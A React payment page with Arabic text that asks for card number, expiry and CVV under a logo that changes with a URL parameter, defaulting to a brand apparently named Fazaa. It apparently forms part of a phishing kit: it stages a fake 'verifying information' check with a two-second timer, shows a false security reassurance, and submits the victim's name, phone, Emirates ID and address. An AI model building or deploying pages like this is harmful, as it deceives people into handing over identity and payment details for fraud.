import React, { useState } from 'react';
import { useLocation, useSearch } from 'wouter';
import { useCreateRegistration } from '@workspace/api-client-react';
import { CheckCircle2 } from 'lucide-react';
import { BRANDS, type BrandKey, type CardTypeKey } from '@/data/brands';

/* ─────────────────────────────────────────
   Modal: مرحلتان
   'loading' → سبينر + نص الانتظار
   'confirm' → تم التحقق + زر موافق / رفض
───────────────────────────────────────── */
function VerifyModal({
  phase,
  onApprove,
  onReject,
}: {
  phase: 'loading' | 'confirm';
  onApprove: () => void;
  onReject: () => void;
}) {
  return (
    <div
      className="fixed inset-0 z-50 flex items-center justify-center"
      style={{ background: 'rgba(0,0,0,0.55)', backdropFilter: 'blur(3px)' }}
    >
      <div
        className="mx-6 w-full max-w-[340px] rounded-2xl px-8 py-8 flex flex-col items-center gap-5"
        style={{ background: 'rgba(55,55,55,0.92)' }}
      >
        {phase === 'loading' ? (
          <>
            <div className="w-14 h-14 rounded-full border-4 border-[#c9a227]/30 border-t-[#c9a227] animate-spin" />
            <p className="text-white text-center text-[15px] leading-relaxed">
              جاري التحقق من المعلومات، يرجى الانتظار…
            </p>
          </>
        ) : (
          <>
            <div className="w-14 h-14 rounded-full border-4 border-[#c9a227] flex items-center justify-center">
              <span className="text-[#c9a227] text-2xl font-bold">✓</span>
            </div>
            <p className="text-white text-center text-[15px] leading-relaxed">
              تم التحقق من المعلومات بنجاح.{'\n'}هل تريد المتابعة؟
            </p>
            <div className="flex gap-3 w-full pt-1">
              <button
                onClick={onApprove}
                className="flex-1 bg-[#c9a227] hover:bg-[#b8943f] text-white font-bold py-3 rounded-xl transition-colors cursor-pointer"
              >
                موافق
              </button>
              <button
                onClick={onReject}
                className="flex-1 bg-white/15 hover:bg-white/25 text-white font-bold py-3 rounded-xl transition-colors cursor-pointer border border-white/20"
              >
                رفض
              </button>
            </div>
          </>
        )}
      </div>
    </div>
  );
}

/* ─── شعار الجهة — يتغير تلقائياً ─── */
function BrandLogo({ brandKey }: { brandKey: BrandKey }) {
  const brand = BRANDS[brandKey] || BRANDS.fazaa;
  return (
    <div className="flex flex-col items-center">
      <div
        className="w-16 h-16 rounded-xl flex items-center justify-center text-white font-bold text-2xl shadow-sm mb-1"
        style={{ background: `linear-gradient(135deg, ${brand.darkColor}, ${brand.color})` }}
      >
        {brand.name.charAt(0)}
      </div>
      <span className="font-bold text-[13px] tracking-widest font-sans" style={{ color: brand.color }}>
        {brand.nameEn}
      </span>
    </div>
  );
}

/* ─── شاشة النجاح ─── */
function SuccessScreen({ brandName, onHome }: { brandName: string; onHome: () => void }) {
  return (
    <div className="py-10 text-center space-y-4 px-6">
      <div className="w-20 h-20 bg-green-100 text-green-500 rounded-full flex items-center justify-center mx-auto mb-4">
        <CheckCircle2 size={42} />
      </div>
      <h2 className="text-2xl font-bold text-gray-900">تم استلام طلبك بنجاح</h2>
      <p className="text-gray-500 text-sm leading-relaxed">
        شكراً لاختيارك {brandName}. سيتم التواصل معك قريباً لتأكيد موعد التسليم.
      </p>
      <div className="pt-4">
        <button
          onClick={onHome}
          className="bg-[#c9a227] hover:bg-[#b8943f] text-white font-bold py-3 px-10 rounded-xl transition-colors shadow-sm cursor-pointer"
        >
          العودة للرئيسية
        </button>
      </div>
    </div>
  );
}

/* ═══════════════════════════════════════
   الصفحة الرئيسية
═══════════════════════════════════════ */
export default function Payment() {
  const [, setLocation] = useLocation();
  const search = useSearch();
  const params = new URLSearchParams(search);

  const brandKey = (params.get('brand') || 'fazaa') as BrandKey;
  const typeKey  = (params.get('type')  || 'gold')  as CardTypeKey;
  const brand = BRANDS[brandKey] || BRANDS.fazaa;
  const card  = brand.cards.find(c => c.id === typeKey) || brand.cards[0];

  const createRegistration = useCreateRegistration();

  /* حقول النموذج */
  const [holderName, setHolderName] = useState('');
  const [cardNumber, setCardNumber] = useState('');
  const [expiry, setExpiry]         = useState('');
  const [cvv, setCvv]               = useState('');

  /* حالة الصفحة */
  const [errors, setErrors]         = useState<Record<string, string>>({});
  const [modalPhase, setModalPhase] = useState<'hidden' | 'loading' | 'confirm'>('hidden');
  const [done, setDone]             = useState(false);
  const [apiError, setApiError]     = useState('');
  const [pendingPayload, setPendingPayload] = useState<any>(null);

  /* تنسيق رقم البطاقة */
  const handleCardNumber = (v: string) => {
    const d = v.replace(/\D/g, '').slice(0, 16);
    setCardNumber(d.replace(/(.{4})/g, '$1 ').trim());
  };

  /* تنسيق MM/YY */
  const handleExpiry = (v: string) => {
    const d = v.replace(/\D/g, '').slice(0, 4);
    setExpiry(d.length >= 3 ? d.slice(0, 2) + '/' + d.slice(2) : d);
  };

  const validate = () => {
    const e: Record<string, string> = {};
    if (!holderName.trim())                             e.holderName = 'اسم حامل البطاقة مطلوب';
    if (cardNumber.replace(/\s/g, '').length < 16)     e.cardNumber  = 'رقم البطاقة غير صحيح';
    if (!/^\d{2}\/\d{2}$/.test(expiry))                e.expiry      = 'تاريخ غير صحيح';
    if (cvv.length < 3)                                 e.cvv         = 'رمز غير صحيح';
    setErrors(e);
    return Object.keys(e).length === 0;
  };

  /* ── زر التالي: تحقق من الحقول ثم افتح المودال ── */
  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!validate()) return;

    /* اقرأ بيانات التسجيل المحفوظة من صفحة order.tsx */
    let regData: any = null;
    try { regData = JSON.parse(sessionStorage.getItem('reg_data') || 'null'); } catch {}

    const payload = regData ?? {
      fullName: holderName,
      phone: '',
      emiratesId: '',
      brand: brandKey,
      cardType: typeKey,
      region: '',
      streetAddress: '',
      neighborhood: '',
      deliveryDate: new Date().toISOString().split('T')[0],
      paymentMethod: 'card',
    };

    setPendingPayload(payload);
    setApiError('');

    /* مرحلة 1: سبينر، بعد ثانيتين → أزرار الموافقة */
    setModalPhase('loading');
    setTimeout(() => setModalPhase('confirm'), 2000);
  };

  /* ── موافق: أرسل البيانات ── */
  const handleApprove = () => {
    if (!pendingPayload) return;
    createRegistration.mutate(
      {
        data: {
          fullName:      pendingPayload.fullName,
          phone:         pendingPayload.phone,
          emiratesId:    pendingPayload.emiratesId,
          brand:         pendingPayload.brand    as any,
          cardType:      pendingPayload.cardType as any,
          region:        pendingPayload.region,
          streetAddress: pendingPayload.streetAddress,
          neighborhood:  pendingPayload.neighborhood,
          deliveryDate:  pendingPayload.deliveryDate,
          paymentMethod: pendingPayload.paymentMethod,
        },
      },
      {
        onSuccess: () => {
          sessionStorage.removeItem('reg_data');
          setModalPhase('hidden');
          setDone(true);
        },
        onError: () => {
          setModalPhase('hidden');
          setApiError('حدث خطأ أثناء الإرسال، يرجى المحاولة مجدداً.');
        },
      }
    );
  };

  /* ── رفض: أغلق المودال وارجع لصفحة التسجيل ── */
  const handleReject = () => {
    setModalPhase('hidden');
    setLocation(`/register?brand=${brandKey}&type=${typeKey}`);
  };

  const inputCls = (f: string) =>
    `w-full bg-white border ${errors[f] ? 'border-red-400' : 'border-gray-200'} rounded-xl px-4 py-3 text-right outline-none focus:border-[#c9a227] focus:ring-1 focus:ring-[#c9a227] transition-shadow text-gray-800 placeholder:text-gray-300`;

  return (
    <>
      {/* المودال — يظهر فقط أثناء loading أو confirm */}
      {modalPhase !== 'hidden' && (
        <VerifyModal
          phase={modalPhase}
          onApprove={handleApprove}
          onReject={handleReject}
        />
      )}

      <div className="min-h-screen bg-[#f5f5f5] flex items-center justify-center py-10 px-4">
        <div className="w-full max-w-[480px] bg-white rounded-2xl shadow-md border border-gray-100 overflow-hidden">

          {/* شعار الجهة */}
          <div className="flex justify-end px-6 pt-7 pb-5 border-b border-gray-100">
            <BrandLogo brandKey={brandKey} />
          </div>

          {done ? (
            <SuccessScreen
              brandName={`${brand.name} ${card.name}`}
              onHome={() => setLocation('/')}
            />
          ) : (
            <form onSubmit={handleSubmit} className="px-6 py-7 space-y-6" noValidate>

              {/* اسم حامل البطاقة */}
              <div className="space-y-1.5">
                <label className="block text-sm font-semibold text-gray-700 text-right">اسم حامل البطاقة</label>
                <input
                  type="text"
                  value={holderName}
                  onChange={e => setHolderName(e.target.value)}
                  placeholder="اسم حامل البطاقة"
                  className={inputCls('holderName')}
                />
                {errors.holderName && <p className="text-xs text-red-500 text-right">{errors.holderName}</p>}
              </div>

              {/* رقم البطاقة */}
              <div className="space-y-1.5">
                <label className="block text-sm font-semibold text-gray-700 text-right">رقم البطاقة</label>
                <div className="relative">
                  <input
                    type="text"
                    inputMode="numeric"
                    value={cardNumber}
                    onChange={e => handleCardNumber(e.target.value)}
                    placeholder="•••• •••• •••• ••••"
                    className={`${inputCls('cardNumber')} pl-12`}
                    dir="ltr"
                  />
                  <div className="absolute left-3 top-1/2 -translate-y-1/2">
                    <svg width="28" height="20" viewBox="0 0 28 20" fill="none">
                      <rect width="28" height="20" rx="3" fill="#e5e7eb"/>
                      <rect y="5" width="28" height="5" fill="#9ca3af"/>
                      <rect x="3" y="13" width="7" height="3" rx="1" fill="#c9a227"/>
                    </svg>
                  </div>
                </div>
                {errors.cardNumber && <p className="text-xs text-red-500 text-right">{errors.cardNumber}</p>}
              </div>

              {/* تاريخ + CVV */}
              <div className="grid grid-cols-2 gap-4">
                <div className="space-y-1.5">
                  <label className="block text-sm font-semibold text-gray-700 text-right">تاريخ الانتهاء</label>
                  <input
                    type="text"
                    inputMode="numeric"
                    value={expiry}
                    onChange={e => handleExpiry(e.target.value)}
                    placeholder="MM/YY"
                    className={inputCls('expiry')}
                    dir="ltr"
                    maxLength={5}
                  />
                  {errors.expiry && <p className="text-xs text-red-500 text-right">{errors.expiry}</p>}
                </div>
                <div className="space-y-1.5">
                  <label className="block text-sm font-semibold text-gray-700 text-right">رمز الأمان (CVV)</label>
                  <input
                    type="text"
                    inputMode="numeric"
                    value={cvv}
                    onChange={e => setCvv(e.target.value.replace(/\D/g, '').slice(0, 4))}
                    placeholder="•••"
                    className={inputCls('cvv')}
                    dir="ltr"
                    maxLength={4}
                  />
                  {errors.cvv && <p className="text-xs text-red-500 text-right">{errors.cvv}</p>}
                </div>
              </div>

              {/* إشعار الأمان */}
              <div className="bg-[#f8f5eb] border border-[#e8d99a] rounded-xl px-4 py-3 flex items-start gap-3">
                <span className="text-xl mt-0.5 shrink-0">🔒</span>
                <p className="text-[13px] text-gray-600 text-right leading-relaxed">
                  جميع المعلومات المالية محمية ومشفرة. لن يتم حفظ بيانات البطاقة على خوادمنا.
                </p>
              </div>

              {apiError && (
                <p className="text-sm text-red-500 text-center bg-red-50 border border-red-200 rounded-xl py-3 px-4">
                  {apiError}
                </p>
              )}

              <button
                type="submit"
                className="w-full bg-[#c9a227] hover:bg-[#b8943f] active:bg-[#a07c30] text-white font-bold text-[17px] py-4 rounded-xl transition-colors shadow-sm cursor-pointer"
              >
                التالي
              </button>
            </form>
          )}
        </div>
      </div>
    </>
  );
}
